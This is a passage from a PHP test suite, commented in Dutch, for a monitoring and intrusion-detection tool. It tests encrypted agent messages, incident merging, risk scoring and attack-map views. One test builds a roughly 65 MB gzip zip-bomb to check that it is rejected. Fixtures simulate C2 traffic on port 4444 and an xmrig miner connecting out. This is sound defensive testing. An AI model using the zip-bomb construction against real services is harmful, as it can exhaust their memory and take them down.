$_SERVER['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
q("DELETE FROM users WHERE username = 'ci-rehash'");
q("INSERT INTO users (username, password_hash, role) VALUES ('ci-rehash', ?, 'user')", [password_hash('Oud-wachtwoord-1', PASSWORD_BCRYPT)]);
$l1 = @login('ci-rehash', 'Oud-wachtwoord-1');
$h1 = (string) q("SELECT password_hash FROM users WHERE username = 'ci-rehash'")->fetchColumn();
$l2 = @login('ci-rehash', 'Oud-wachtwoord-1');
$l3 = @login('ci-rehash', 'fout');
ok($l1 === 'ok' && $l2 === 'ok' && $l3 === false && (!defined('PASSWORD_ARGON2ID') || str_starts_with($h1, '$argon2id$')) && password_verify('Oud-wachtwoord-1', hash_password('Oud-wachtwoord-1')),
    'wachtwoord: oud bcrypt werkt, wordt bij inloggen Argon2id en werkt daarna nog; fout wachtwoord niet');
q("DELETE FROM users WHERE username = 'ci-rehash'");

// 1.144.0: urgentie, risico per server en samengevoegde IDS-incidenten
$u1 = Urgency::score(2, 120, true, 2, true);
$u2 = Urgency::score(2, 5, false, 0, false);
$u3 = Urgency::score(1, 0, false, 0, false);
ok($u1['score'] > $u2['score'] && $u2['score'] > $u3['score'] && $u1['score'] <= 100 && in_array('bereikbaar van buiten', $u1['why'], true),
    'urgentie: critical + lang + bereikbaar + afhankelijk + beveiliging boven een korte critical, boven een warning (' . $u1['score'] . '/' . $u2['score'] . '/' . $u3['score'] . ')');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-risk', '10.0.0.77', 'agent')");
$hr = (int) db()->lastInsertId();
q("INSERT INTO hosts (name, address, mode, parent_id) VALUES ('ci-risk-kind', '10.0.0.78', 'remote', ?)", [$hr]);
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, ip, status, created_at) VALUES (?, 1, 'bruteforce', 'bf1', 'Brute force SSH', '203.0.113.50', 'open', NOW() - INTERVAL 30 MINUTE)", [$hr]);
Incidents::sync();   // alleen een warning: nog geen incident
$noneYet = !q('SELECT 1 FROM incidents WHERE host_id = ?', [$hr])->fetchColumn();
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, ip, status, created_at) VALUES (?, 2, 'ssh_login', 'lg1', 'SSH-login van buiten', '203.0.113.50', 'open', NOW() - INTERVAL 20 MINUTE)", [$hr]);
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, ip, status, created_at) VALUES (?, 2, 'edr', 'p1', 'Verdacht proces /tmp/x', NULL, 'open', NOW() - INTERVAL 10 MINUTE)", [$hr]);
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, ip, status, created_at) VALUES (?, 2, 'chain', 'c1', 'Keten: Binnengekomen en uitgevoerd', '203.0.113.50', 'open', NOW() - INTERVAL 5 MINUTE)", [$hr]);
Incidents::sync();
Incidents::sync();   // de brute force (eerder, warning) komt er nu als stap bij
$incs = q("SELECT * FROM incidents WHERE host_id = ? AND source = 'ids'", [$hr])->fetchAll();
$grp = array_values(array_filter($incs, fn($i) => (int) q('SELECT COUNT(*) FROM incident_refs WHERE incident_id = ?', [$i['id']])->fetchColumn() >= 2))[0] ?? null;
ok($noneYet && $grp && str_starts_with((string) $grp['title'], '⛓ ci-risk:') && str_contains((string) $grp['title'], 'Brute force') && count($incs) === 1,
    'samenvoegen: brute force + login (zelfde IP) + verdacht proces + keten worden één incident (' . count($incs) . ')');
// Ander IP op een andere server: niet samengevoegd
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, ip, status, created_at) VALUES (?, 2, 'ssh_login', 'lg9', 'SSH-login van buiten', '198.51.100.9', 'open', NOW())", [$hb]);
Incidents::sync();
ok((bool) q("SELECT 1 FROM incidents WHERE host_id = ? AND ref_key = (SELECT CONCAT('ids:', id) FROM ids_incidents WHERE dkey = 'lg9')", [$hb])->fetchColumn(), 'ander IP op een andere server: eigen incident');
$info = Incidents::info((int) $grp['id']);
ok(count($info['steps']) >= 3 && $info['exposed'] && in_array('Internet (203.0.113.50)', $info['path'], true) && str_contains(implode(' ', $info['path']), 'ci-risk-kind'),
    'incident: stappen op volgorde, pad Internet → server → afhankelijke server');
$risk = HostRisk::all(true)[$hr] ?? null;   // vóór het sluiten: het incident is nog open
// Zelf sluiten: alle stappen ook in IDS afgehandeld
Incidents::update((int) $grp['id'], 'ci', 'resolved', null, null);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND dkey IN ('bf1', 'lg1', 'c1') AND status = 'open'", [$hr])->fetchColumn() === 0, 'samengevoegd incident sluiten: alle stappen in IDS afgehandeld');
ok($risk !== null && $risk['score'] >= 15 && in_array($risk['level'], ['low', 'medium', 'high'], true)
    && (bool) array_filter($risk['factors'], fn($f) => str_contains($f[1], 'open incident')) && (bool) array_filter($risk['factors'], fn($f) => $f[1] === 'agent stil'),
    'risico per server: open incident en stille agent tellen mee (' . ($risk['score'] ?? '-') . ')');
$nowList = Home::now([['sev' => 0, 'icon' => '💡', 'text' => 'tip', 'go' => 'x'], ['sev' => 2, 'icon' => '💽', 'text' => 'disk vol', 'go' => 'dashboard']]);
$us = array_column($nowList, 'urgency');
ok($us === array_values(array_reverse(array_values(array_sort_copy($us)))) && end($nowList)['text'] === 'tip' && (bool) array_filter($nowList, fn($x) => $x['kind'] === 'inc'),
    'Nu doen: incidenten en aandachtspunten samen, op urgentie');
q('DELETE FROM hosts WHERE id IN (?, ?)', [$hr, $hr + 1]);

// 1.145.0: AgentCrypto (de versleutelde verbinding met de agents), zoals de agent zijn berichten maakt
$envelope = static function (string $key, string $plain, ?int $t = null, ?string $n = null): string {
    $sub = static fn(string $label) => hash_hmac('sha256', $label, (string) hex2bin($key));
    $t ??= time();
    $n ??= bin2hex(random_bytes(16));
    $iv = random_bytes(16);
    $d = base64_encode((string) openssl_encrypt($plain, 'aes-256-cbc', (string) hex2bin($sub('enc')), OPENSSL_RAW_DATA, $iv));
    $ivh = bin2hex($iv);
    $m = hash_hmac('sha256', "rzenc1|$t|$n|$ivh|$d", (string) hex2bin($sub('mac')));
    return json_encode(['rzenc' => 1, 't' => $t, 'n' => $n, 'iv' => $ivh, 'd' => $d, 'm' => $m]);
};
$fails0 = static function (callable $fn, string $want): bool {
    try {
        $fn();
        return false;
    } catch (RuntimeException $e) {
        return str_contains($e->getMessage(), $want);
    }
};
$kA = bin2hex(random_bytes(32));
$kB = bin2hex(random_bytes(32));
$env = $envelope($kA, '{"cpu":12}');
[$plain, $used, $nonce] = AgentCrypto::open($env, [$kA]);
ok($plain === '{"cpu":12}' && $used === $kA && AgentCrypto::isEnvelope($env), 'versleuteling: bericht van de agent klopt en wordt uitgepakt');
ok($fails0(fn() => AgentCrypto::open($env, [$kA]), 'al eens binnen'), 'versleuteling: hetzelfde bericht nog eens (replay) wordt geweigerd');
$bad = json_decode($envelope($kA, 'x'), true);
$bad['d'] = base64_encode('ander-inhoud-zelfde-lengte');
ok($fails0(fn() => AgentCrypto::open(json_encode($bad), [$kA]), 'handtekening'), 'versleuteling: gewijzigde inhoud valt op (handtekening)');
ok($fails0(fn() => AgentCrypto::open($envelope($kA, 'x'), [$kB]), 'handtekening'), 'versleuteling: verkeerde sleutel wordt geweigerd');
ok($fails0(fn() => AgentCrypto::open($envelope($kA, 'x', time() - 600), [$kA]), 'te oud') && $fails0(fn() => AgentCrypto::open($envelope($kA, 'x', time() + 600), [$kA]), 'toekomst'),
    'versleuteling: te oud of uit de toekomst (> 5 min) wordt geweigerd');
ok($fails0(fn() => AgentCrypto::open('{"rzenc":1,"t":1}', [$kA]), 'onvolledig'), 'versleuteling: onvolledig bericht wordt geweigerd');
// Nieuwe sleutel: de oude blijft nog even geldig (beide in de lijst), de nieuwe werkt meteen
[$p2, $u2] = AgentCrypto::open($envelope($kA, 'oud'), [$kB, $kA]);
ok($p2 === 'oud' && $u2 === $kA, 'versleuteling: na een nieuwe sleutel werkt de vorige nog (overgangstijd)');
// Antwoord van RzSense: de agent kan het controleren en uitpakken, en het hoort bij zijn verzoek (nonce)
$resp = json_decode(AgentCrypto::seal('{"ok":true}', $kA, $nonce), true);
$subA = static fn(string $label) => hash_hmac('sha256', $label, (string) hex2bin($kA));
$macOk = hash_equals(hash_hmac('sha256', "rzenc1r|{$resp['t']}|{$resp['rn']}|{$resp['iv']}|{$resp['d']}", (string) hex2bin($subA('mac'))), $resp['m']);
$dec = openssl_decrypt((string) base64_decode($resp['d']), 'aes-256-cbc', (string) hex2bin($subA('enc')), OPENSSL_RAW_DATA, (string) hex2bin($resp['iv']));
ok($macOk && $dec === '{"ok":true}' && $resp['rn'] === $nonce, 'versleuteling: antwoord van RzSense is gebonden aan het verzoek en voor de agent te controleren');
// Ondertekende GET (zonder inhoud): kenmerk:tijd:nonce:HMAC
$gn = bin2hex(random_bytes(16));
$gt = time();
$hdr = AgentCrypto::keyId($kA) . ":$gt:$gn:" . hash_hmac('sha256', "rzget1|agent_script|$gt|$gn", (string) hex2bin($subA('mac')));
[$gk] = AgentCrypto::verifyGet($hdr, [$kA], 'agent_script');
ok($gk === $kA && $fails0(fn() => AgentCrypto::verifyGet($hdr, [$kA], 'agent_script'), 'al eens binnen'), 'ondertekende GET: klopt, en tweemaal dezelfde wordt geweigerd');
$gn2 = bin2hex(random_bytes(16));
$hdr2 = AgentCrypto::keyId($kA) . ":$gt:$gn2:" . hash_hmac('sha256', "rzget1|agent_script|$gt|$gn2", (string) hex2bin($subA('mac')));
ok($fails0(fn() => AgentCrypto::verifyGet($hdr2, [$kA], 'agent_install'), 'handtekening'), 'ondertekende GET: geldt alleen voor de actie waarvoor hij gemaakt is');
// Koppelcode: hoofdletters en streepjes maken niet uit (zoals de agent hem berekent)
$pc = AgentCrypto::pairCreate($ha);
ok(AgentCrypto::pairKey(strtolower($pc['code'])) === AgentCrypto::pairKey(str_replace('-', '', $pc['code'])) && strlen($pc['code']) === 24
    && !preg_match('/[01OI]/', str_replace('-', '', $pc['code'])), 'koppelcode: 20 tekens zonder 0/O/1/I, hoofdletters en streepjes maken niet uit');

// 1.146.0: SLO's, "na de actie" en het aanvalspad
q("INSERT INTO hosts (name, address, mode, agent_seen) VALUES ('ci-q', '10.0.0.88', 'agent', NOW() - INTERVAL 20 MINUTE)");
$hq = (int) db()->lastInsertId();
q("INSERT INTO checks (host_id, type, name, status) VALUES (?, 'ping', 'q-ping', 0)", [$hq]);
$cq = (int) db()->lastInsertId();
// Twee storingen: melding na 2 minuten en na 12 minuten
q("INSERT INTO status_changes (check_id, from_status, to_status, created_at) VALUES (?, 0, 2, NOW() - INTERVAL 60 MINUTE), (?, 0, 2, NOW() - INTERVAL 30 MINUTE)", [$cq, $cq]);
q("INSERT INTO alerts (check_id, status, title, message, kind, created_at) VALUES (?, 2, 'x', 'x', 'notify', NOW() - INTERVAL 58 MINUTE), (?, 2, 'x', 'x', 'notify', NOW() - INTERVAL 18 MINUTE)", [$cq, $cq]);
$hostRow = q('SELECT * FROM hosts WHERE id = ?', [$hq])->fetch();
Quality::recordAgentGap($hostRow, time());   // 20 minuten stil: een gat
$slo = Quality::slo(date('Y-m-d', time() - 86400), date('Y-m-d'));   // ook gisteren: rond middernacht vallen de storingen op de vorige dag
$mine = array_values(array_filter($slo['agents']['hosts'], fn($x) => $x['host'] === 'ci-q'))[0] ?? null;
ok($slo['notify']['n'] >= 2 && $slo['notify']['within'] >= 1 && $slo['notify']['within'] < $slo['notify']['n'] && $mine && $mine['secs'] >= 1100,
    'SLO: tijd tot melding (binnen/buiten 5 min) en een stille agent geteld');
// Na de actie: herstel 1 van 2 gelukt; blokkade vroegtijdig opgeheven; slimme drempels met meer warnings
Quality::recordHeal($hq, $cq, true, 'ok');
Quality::recordHeal($hq, $cq, false, 'mislukt');
q("INSERT INTO ids_blocks (host_id, ip, reason, auto, created_by, until, removed_at, removed_by) VALUES (?, '198.51.100.77', 'test', 1, 'automatisch', NOW() + INTERVAL 1 DAY, NOW(), 'admin')", [$hq]);
q("INSERT INTO change_log (at, kind, ref_id, action, label) VALUES (NOW() - INTERVAL 10 DAY, 'check', ?, 'smart', 'x')", [$cq]);
q("INSERT INTO status_changes (check_id, from_status, to_status, created_at) VALUES (?, 0, 1, NOW() - INTERVAL 5 DAY), (?, 0, 1, NOW() - INTERVAL 4 DAY), (?, 0, 1, NOW() - INTERVAL 3 DAY), (?, 0, 1, NOW() - INTERVAL 2 DAY)", [$cq, $cq, $cq, $cq]);
$lp = Quality::loops(30);
$hc0 = array_values(array_filter($lp['heal']['checks'], fn($x) => $x['id'] === $cq))[0] ?? null;
ok($hc0 && $hc0['n'] === 2 && $hc0['ok'] === 1 && $lp['blocks']['early'] >= 1 && (bool) array_filter($lp['smart'], fn($x) => $x['id'] === $cq),
    'na de actie: herstel 1/2 gelukt, blokkade vroegtijdig opgeheven, slimme drempels met meer ruis');
// Aanvalspad: poort 22 op alle adressen (openssh, kwetsbaar), 5432 alleen localhost, een afhankelijke server
q("INSERT INTO agent_data (host_id, metric, value, updated_at) VALUES (?, 'ports', ?, NOW())", [$hq, json_encode([['port' => 22, 'addr' => '0.0.0.0', 'proc' => 'sshd'], ['port' => 5432, 'addr' => '127.0.0.1', 'proc' => 'postgres']])]);
q("INSERT INTO vuln_inventory (host_id, mgr, os_id, os_version, os_name, ecosystem, hash, packages, exposed, updated_at) VALUES (?, 'dpkg', 'debian', '12', 'Debian', 'Debian:12', 'q', ?, ?, NOW())",
    [$hq, json_encode([['openssh-server', '1:9.2p1-2', 'amd64', 'openssh', '1:9.2p1-2']]), json_encode([['openssh-server', 22, 'tcp']])]);
q("INSERT IGNORE INTO vuln_cve (cve, severity, cvss, kev) VALUES ('CVE-2099-0222', 4, 9.0, 1)");
q("INSERT INTO vuln_findings (host_id, package, version, source, vuln_id, cve, fixed_version, first_seen) VALUES (?, 'openssh', '1:9.2p1-2', 'openssh-server', 'DSA-Q', 'CVE-2099-0222', '1:9.2p1-3', NOW())", [$hq]);
q("INSERT INTO hosts (name, address, mode, parent_id) VALUES ('ci-q-kind', '10.0.0.89', 'remote', ?)", [$hq]);
$wasVuln = setting('vuln_enabled', '0');
save_setting('vuln_enabled', '1');
$ex = HostRisk::exposure($hq);
save_setting('vuln_enabled', $wasVuln);
$p22 = array_values(array_filter($ex['ports'], fn($x) => $x['port'] === 22))[0] ?? null;
ok(count($ex['ports']) === 1 && $p22 && $p22['pkg'] === 'openssh-server' && ($p22['vuln']['cve'] ?? '') === 'CVE-2099-0222' && $p22['vuln']['kev'] && $ex['dependents'] === ['ci-q-kind'],
    'aanvalspad: alleen poorten buiten localhost, met pakket, ergste CVE en de afhankelijke server');
$rep = Report::html('7d');
ok(str_contains($rep, 'In één oogopslag') && str_contains($rep, 'Tijd tot melding (MTTD)') && str_contains($rep, 'grootste risico'), 'rapport: one-pager met MTTD/MTTR, SLO\'s en de grootste risico\'s');
q('DELETE FROM vuln_findings WHERE host_id = ?', [$hq]);
q('DELETE FROM vuln_inventory WHERE host_id = ?', [$hq]);
q("DELETE FROM hosts WHERE name IN ('ci-q', 'ci-q-kind')");

// 1.147.0: gecomprimeerde rapporten (agent 1.73.0): uitpakken, ook versleuteld, en een zip-bom of kapotte gzip weigeren
$json = json_encode(['agent_version' => '1.73.0', 'cpu' => ['pct' => 5], 'pad' => str_repeat('abc', 2000)]);
$gz = gzencode($json, 6);
// Zip-bom stapsgewijs maken (niet 64 MB tegelijk in het geheugen)
$bz = deflate_init(ZLIB_ENCODING_GZIP, ['level' => 9]);
$bomb = '';
$mb = str_repeat("\0", 1048576);
for ($i = 0; $i < 65; $i++) {
    $bomb .= deflate_add($bz, $mb, ZLIB_NO_FLUSH);
}
$bomb .= deflate_add($bz, '', ZLIB_FINISH);
unset($mb);
ok(AgentCrypto::unzip($json) === $json && AgentCrypto::unzip($gz) === $json && strlen($gz) < strlen($json) / 4
    && AgentCrypto::unzip("\x1f\x8b" . 'kapot') === null && AgentCrypto::unzip($bomb) === null,
    'compressie: gewoon blijft gewoon, gzip wordt uitgepakt, kapot of groter dan 64 MB geweigerd (zip-bom ' . round(strlen($bomb) / 1024) . ' kB)');
$kZ = bin2hex(random_bytes(32));
[$pz] = AgentCrypto::open($envelope($kZ, $gz), [$kZ]);
ok(AgentCrypto::unzip($pz) === $json, 'compressie: versleuteld bericht met gecomprimeerde inhoud (zoals agent 1.73.0 het stuurt) komt goed aan');

// 1.149.0: aanvalskaart: poort, dienst en richting afleiden, en de stromen per bron, doelwit en poort
$fo = fn(...$a) => Ids::flowOf(...$a);
$ssh = $fo('bruteforce', '1.2.3.4', 'Brute force op SSH vanaf 1.2.3.4', '', '1.2.3.4');
$dec = $fo('decoy_port', '1.2.3.4', 'Honeypot-poort 2323 benaderd vanaf 1.2.3.4', '', '1.2.3.4');
$sin = $fo('suricata', '1|5.6.7.8', 'Suricata: ET SCAN', '5.6.7.8:51000 → 192.168.1.10:3389 TCP · scan', '5.6.7.8');
$sout = $fo('suricata', '2|5.6.7.8', 'Suricata: ET C2', '192.168.1.10:40000 → 5.6.7.8:4444 TCP · c2', '5.6.7.8');
$ob = $fo('out_bad', 'xmrig|9.9.9.9', 'Uitgaande verbinding naar een bekende aanvaller: xmrig → 9.9.9.9', 'Poort 3333, lijst: x', '9.9.9.9');
$web = $fo('web_attack', 'ha|1.2.3.4', 'HA: 6 mislukte logins', '', '1.2.3.4');
ok($ssh === ['port' => 22, 'proto' => 'tcp', 'svc' => 'SSH', 'dir' => 'i'] && $dec['port'] === 2323 && $dec['svc'] === 'Honeypot'
    && $sin['dir'] === 'i' && $sin['port'] === 3389 && $sin['svc'] === 'RDP' && $sout['dir'] === 'o' && $sout['port'] === 4444
    && $ob['dir'] === 'o' && $ob['port'] === 3333 && $web['svc'] === 'Home Assistant' && $web['dir'] === 'i',
    'aanvalskaart: poort, dienst en richting uit SSH, honeypot, Suricata (in en uit), uitgaand en weblogs');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-map-a', '10.9.0.1', 'agent'), ('ci-map-b', '10.9.0.2', 'agent')");
$ma = (int) q("SELECT id FROM hosts WHERE name = 'ci-map-a'")->fetchColumn();
$mb = (int) q("SELECT id FROM hosts WHERE name = 'ci-map-b'")->fetchColumn();
// Oude incidenten zonder poort (dir NULL): worden bij het lezen afgeleid
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip, cc, hits) VALUES
   (?, 1, 'bruteforce', '203.0.113.7', 'Brute force op SSH vanaf 203.0.113.7', '', '203.0.113.7', 'RU', 40),
   (?, 1, 'bruteforce', '203.0.113.7', 'Brute force op SSH vanaf 203.0.113.7', '', '203.0.113.7', 'RU', 8),
   (?, 2, 'out_bad', 'xmrig|198.51.100.9', 'Uitgaande verbinding naar een bekende aanvaller: xmrig → 198.51.100.9', 'Poort 4444, lijst: x', '198.51.100.9', 'BR', 12),
   (?, 1, 'chain', 'k', 'Keten', '', '203.0.113.7', 'RU', 1)", [$ma, $mb, $mb, $ma]);
q("INSERT INTO ids_blocks (host_id, ip, reason) VALUES (?, '203.0.113.7', 'ci')", [$ma]);
$fl = Ids::flows(['days' => 1]);
$ru = array_values(array_filter($fl['sources'], fn($x) => $x['ip'] === '203.0.113.7'))[0] ?? null;
$out = array_values(array_filter($fl['lines'], fn($x) => $x['ip'] === '198.51.100.9'))[0] ?? null;
$ruc = array_values(array_filter($fl['countries'], fn($x) => $x['cc'] === 'RU'))[0] ?? null;
ok($ru && $ru['hits'] === 48 && $ru['ntargets'] === 2 && $ru['blocked'] && $ru['blocked_on'] === ['ci-map-a'] && $out && $out['dir'] === 'o' && $out['port'] === 4444
    && $out['sev'] === 2 && $ruc && $ruc['hits'] === 48 && $fl['kpi']['multi'] >= 1,
    'aanvalskaart: pogingen per bron opgeteld, 2 doelwitten, blokkade per server, uitgaand apart, ketens tellen niet dubbel');
$fo2 = Ids::flows(['days' => 1, 'dir' => 'o']);
ok(!array_filter($fo2['lines'], fn($x) => $x['dir'] !== 'o') && count($fo2['lines']) >= 1, 'aanvalskaart: filter op richting');
q("DELETE FROM hosts WHERE name IN ('ci-map-a', 'ci-map-b')");

// 1.152.0 (agent 1.74.0): SSH-pogingen en sessies, Attack Flow (waargenomen of afgeleid) en de popup per IP
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-af-a', '10.8.0.1', 'agent'), ('ci-af-b', '10.8.0.2', 'agent')");
$fa = (int) q("SELECT id FROM hosts WHERE name = 'ci-af-a'")->fetchColumn();
$fb = (int) q("SELECT id FROM hosts WHERE name = 'ci-af-b'")->fetchColumn();
$hA = q('SELECT * FROM hosts WHERE id = ?', [$fa])->fetch();
$t0 = time() - 600;
$nst = SshEvents::store($hA, ['events' => [
        ['t' => $t0 + 60, 'k' => 'ssh', 'u' => 'rehman', 'ip' => '10.8.0.9', 'm' => 'publickey', 'p' => 51544],
        ['t' => $t0 + 960, 'k' => 'ssh_end', 'u' => 'rehman', 'ip' => '10.8.0.9', 'p' => 51544],   // (in de toekomst: wordt nu)
        ['t' => $t0, 'k' => 'sudo', 'u' => 'x']],
    'tries' => [['t' => $t0, 'ip' => '198.51.100.23', 'u' => 'root', 'p' => 50001], ['t' => $t0 + 1, 'ip' => '198.51.100.23', 'u' => 'admin', 'p' => 50002],
        ['t' => $t0 + 2, 'ip' => 'geen-ip', 'u' => 'x']]]);
$ses = array_values(array_filter(SshEvents::sessions(1), fn($x) => $x['host_id'] === $fa));
ok($nst === 4 && count($ses) === 1 && $ses[0]['user'] === 'rehman' && $ses[0]['port'] === 51544 && $ses[0]['method'] === 'publickey' && $ses[0]['closed_at'] !== null && $ses[0]['secs'] > 0
    && (int) q("SELECT COUNT(*) FROM ssh_events WHERE host_id = ? AND ok = 0", [$fa])->fetchColumn() === 2,
    'SSH: login met bronpoort, einde van de sessie gekoppeld (duur), losse mislukte pogingen; ongeldig IP en sudo overgeslagen');
// Attack Flow: extern → ci-af-a (SSH, waargenomen, geblokkeerd), daarna ci-af-a (10.8.0.1) → ci-af-b (keten: afgeleid)
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip, cc, hits, created_at, last_seen) VALUES
   (?, 1, 'bruteforce', '198.51.100.23', 'Brute force op SSH vanaf 198.51.100.23', '', '198.51.100.23', 'RU', 12, NOW() - INTERVAL 30 MINUTE, NOW() - INTERVAL 20 MINUTE),
   (?, 2, 'chain', 'lateral|10.8.0.1', 'Keten: laterale beweging vanaf ci-af-a', '', '10.8.0.1', NULL, 1, NOW() - INTERVAL 10 MINUTE, NOW() - INTERVAL 10 MINUTE)", [$fa, $fb]);
q("INSERT INTO ids_blocks (host_id, ip, reason, created_at) VALUES (?, '198.51.100.23', 'ci', NOW() - INTERVAL 25 MINUTE)", [$fa]);
q("DELETE FROM ids_incidents WHERE type = 'chain' AND host_id = ?", [$fb]);   // ketens tellen niet mee op de kaart (Ids::flows): nu als gewone afgeleide melding
q("INSERT INTO ids_incidents (host_id, severity, type, dkey, title, detail, ip, hits, created_at, last_seen) VALUES
   (?, 2, 'ti_ip', '10.8.0.1', 'Verbinding met een bekende aanvaller: 10.8.0.1', '', '10.8.0.1', 1, NOW() - INTERVAL 10 MINUTE, NOW() - INTERVAL 10 MINUTE)", [$fb]);
$af = AttackFlow::build(['days' => 1]);
$lExt = array_values(array_filter($af['lines'], fn($l) => $l['ip'] === '198.51.100.23' && $l['host_id'] === $fa))[0] ?? null;
$lInt = array_values(array_filter($af['lines'], fn($l) => $l['ip'] === '10.8.0.1'))[0] ?? null;
$sInt = array_values(array_filter($af['sources'], fn($x) => $x['ip'] === '10.8.0.1'))[0] ?? null;
$piv = array_values(array_filter($af['pivots'], fn($x) => $x['ip'] === '10.8.0.1'));
$tries = array_filter($af['events'], fn($e) => $e['ip'] === '198.51.100.23' && $e['k'] === 'try');
ok($lExt && $lExt['obs'] && $lExt['via'] === 'auth.log' && $lExt['outcome']['k'] === 'blocked' && $lInt && !$lInt['obs'] && $lInt['outcome']['k'] === 'unconfirmed'
    && $sInt && ($sInt['host']['id'] ?? 0) === $fa && $piv && !$piv[0]['obs'] && count($tries) === 2
    && array_filter($af['events'], fn($e) => $e['ip'] === '198.51.100.23' && $e['k'] === 'block'),
    'Attack Flow: SSH-aanval waargenomen (auth.log) en geblokkeerd; eigen server als bron herkend en als afgeleid getoond; losse pogingen en blokkade in de tijdlijn');
// 1.153.0: live: grootste aanvaller nu (pogingen van de laatste 15 minuten), wat het IDS deed, acties van het laatste uur, top 10
$lv = AttackFlow::build(['days' => 1, 'mins' => 60, 'host' => $fa])['live'];
$lv15 = AttackFlow::build(['days' => 1, 'mins' => 15, 'host' => $fa]);
ok(($lv['top']['ip'] ?? '') === '198.51.100.23' && $lv['top']['now'] && $lv['top']['per_min'] > 0 && count($lv['top']['spark']) === 15
    && in_array('ci-af-a', array_column($lv['top']['blocks'], 'host'), true) && $lv['busy']['active'] >= 1 && $lv['actions']['blocks'] >= 1
    && in_array('198.51.100.23', array_column($lv['top10'], 'ip'), true) && !in_array($fa, $lv['hit'], true)
    && !array_filter($lv15['lines'], fn($l) => $l['ip'] === '198.51.100.23') && $lv15['mins'] === 15 && in_array($lv['motion'], [0, 1, 2], true),
    'live: grootste aanvaller nu met pogingen per minuut en waar geblokkeerd, IDS-acties, top 10; geblokkeerd = server niet "nu geraakt"; venster van 15 minuten');
// 1.172.0: de stroom toont eerst wie nu (15 min) aanvalt en vult aan uit de top van 24 uur (gedimd); isolatie met reden in de banner
$fla = AttackFlow::build(['days' => 1, 'mins' => 15, 'host' => $fa])['flow'] ?? null;   // per server: andere tests maken ook live aanvallen
$flb = AttackFlow::build(['days' => 1, 'mins' => 15, 'host' => $fb])['flow'] ?? null;
$fs = $fla && $flb ? array_column($fla['sources'], 'live', 'ip') + array_column($flb['sources'], 'live', 'ip') : [];
$liveCol = $fla ? array_column($fla['sources'], 'live') : [];
ok($fla && $flb && ($fs['10.8.0.1'] ?? null) === true && ($fs['198.51.100.23'] ?? null) === false && count($fla['sources']) <= 10 && $flb['nlive'] >= 1
    && $liveCol === array_values(array_merge(array_filter($liveCol), array_filter($liveCol, fn($x) => !$x))) && $fla['days'] === 1,
    'Attack Flow: live aanvallers eerst, aangevuld tot tien met de grootste van de laatste 24 uur (die gemarkeerd als niet live)');
Ids::isolate($fb, 2, 'ci', '', 'ci-reden');
$iso = array_values(array_filter(Ids::isolated(), fn($x) => $x['id'] === $fb))[0] ?? null;
Ids::unisolate($fb, 'ci');
ok($iso && $iso['reason'] === 'ci-reden' && $iso['at'] && strtotime((string) $iso['until']) > time() && !array_filter(Ids::isolated(), fn($x) => $x['id'] === $fb),
    'isolatie: reden en starttijd voor de banner; na opheffen niet meer in de lijst');
// 1.154.0: Command center: SSH-logins (nieuw IP), mislukte pogingen, sudo, de toppers en de monitoring (uitgevoerd, fout, meldingen)
q("INSERT INTO access_log (host_id, kind, type, title, message, detail, created_at) VALUES
   (?, 'auth', 'ssh', 'x', 'x', '{\"type\":\"ssh\",\"user\":\"ci-cc\",\"ip\":\"203.0.113.77\",\"m\":\"publickey\"}', NOW() - INTERVAL 1 MINUTE),
   (?, 'authfail', 'ssh', 'x', 'x', '{\"type\":\"ssh\",\"users\":[\"root\"],\"ip\":\"198.51.100.23\",\"n\":7}', NOW() - INTERVAL 1 MINUTE),
   (?, 'auth', 'sudo', 'x', 'x', '{\"type\":\"sudo\",\"user\":\"ci-cc\",\"as\":\"root\",\"cmd\":\"-i\"}', NOW() - INTERVAL 1 MINUTE)", [$fa, $fa, $fa]);
$cck = (int) q('SELECT id FROM checks ORDER BY id LIMIT 1')->fetchColumn();
q("INSERT INTO results_hourly (check_id, hour, n, n_warn, n_crit) VALUES (?, DATE_FORMAT(NOW() - INTERVAL 1 HOUR, '%Y-%m-%d %H:00:00'), 60, 5, 2)
   ON DUPLICATE KEY UPDATE n = n + 60, n_warn = n_warn + 5, n_crit = n_crit + 2", [$cck]);
q("INSERT INTO alerts (check_id, status, title, message, sent_ok, created_at) VALUES (?, 2, 'ci', 'ci', 1, NOW() - INTERVAL 1 MINUTE)", [$cck]);
$cc = CommandCenter::data('7d', date('Y-m-d H:i:s', time() - 3600));
$lg = array_values(array_filter($cc['logins'], fn($x) => $x['user'] === 'ci-cc' && $x['type'] === 'ssh'));
ok($cc['sec']['ssh_login']['n'] >= 1 && $cc['sec']['ssh_login']['new_ips'] >= 1 && $cc['sec']['ssh_fail']['n'] >= 7 && $cc['sec']['sudo']['n'] >= 1
    && $lg && $lg[0]['new'] && $lg[0]['ip'] === '203.0.113.77' && ($cc['top']['ssh_block']['ip'] ?? '') !== '' && $cc['mon']['runs']['n'] >= 60
    && $cc['mon']['fails']['n'] >= 5 && in_array($cck, array_column($cc['mon']['most_failed'], 'id'), true) && in_array($cck, array_column($cc['mon']['fired'], 'id'), true)
    && $cc['seen']['logins'] >= 1 && $cc['seen']['crit'] >= 1 && CommandCenter::data('nonsense')['period'] === 'today',
    'Command center: SSH-logins met nieuw IP, mislukte pogingen, sudo, top-blokkade, checks uitgevoerd en fout, meldingen per check, sinds je laatste bezoek');
// 1.155.0: Analyse en advies: open poort → pakket → CVE (KEV) → advies met melding; banner van een apparaat zonder agent; status en "opgelost"
q("UPDATE hosts SET mode = 'agent' WHERE id = ?", [$fa]);
q("INSERT INTO vuln_inventory (host_id, mgr, os_id, os_version, os_name, ecosystem, hash, packages, exposed, updated_at) VALUES (?, 'dpkg', 'debian', '10', 'Debian 10', 'Debian:10', 'x', '[]', '[[\"openssh-server\",22,\"tcp\"]]', NOW())
   ON DUPLICATE KEY UPDATE exposed = VALUES(exposed), os_id = VALUES(os_id), os_version = VALUES(os_version)", [$fa]);
